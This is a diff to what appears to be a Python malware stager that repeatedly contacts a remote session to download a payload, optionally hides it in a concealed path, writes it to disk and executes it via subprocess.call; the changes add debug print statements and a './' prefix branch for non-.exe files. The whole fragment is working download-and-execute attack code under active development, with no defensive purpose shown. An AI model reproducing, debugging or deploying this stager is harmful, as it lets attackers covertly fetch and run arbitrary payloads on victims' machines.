@@ -58,24 +58,40 @@ def get_payload(sess):
 
     return payload
 
-
+print("Before while true block")
 while True:
     print("Getting payload inside stager")
     payload = get_payload(connect())
 
     if len(payload):
+        print("Payload variable has been created! Exinting the stager's while True block")
+        print()
         break
 
     print('Failed to download payload.\nRetrying...\n')
     time.sleep(random.randint(15, 30))
 
 # write to file
-path = os.path.join(pathfinder.Finder().find(),
-                    PAYLOAD_FILE) if HIDE_PAYLOAD else PAYLOAD_FILE
+print(f"Hiding the payload? {HIDE_PAYLOAD}")
+if HIDE_PAYLOAD:
+    print(f"FYI pathfinder.Finder().find(): {pathfinder.Finder().find()}")
+    path = os.path.join(pathfinder.Finder().find(), PAYLOAD_FILE)
+else: 
+    path = PAYLOAD_FILE
+
+print(f"Looking for path: {path}")
 
 with open(path, 'wb') as f:
+    print(f"Writing payload to {f}!!!")
     for i in range(0, len(payload), BLOCK_SIZE):
         f.write(payload[i:i + BLOCK_SIZE])
 
+print("Payload writing complete")
+
 # execute
-subprocess.call(path.split(), shell=True)
+print(f"Calling subprocess.call of: {path.split()}")
+if ".exe" in path:
+    subprocess.call(path.split(), shell=True)
+else:
+    path = "./" + path
+    subprocess.call(path.split(), shell=True)
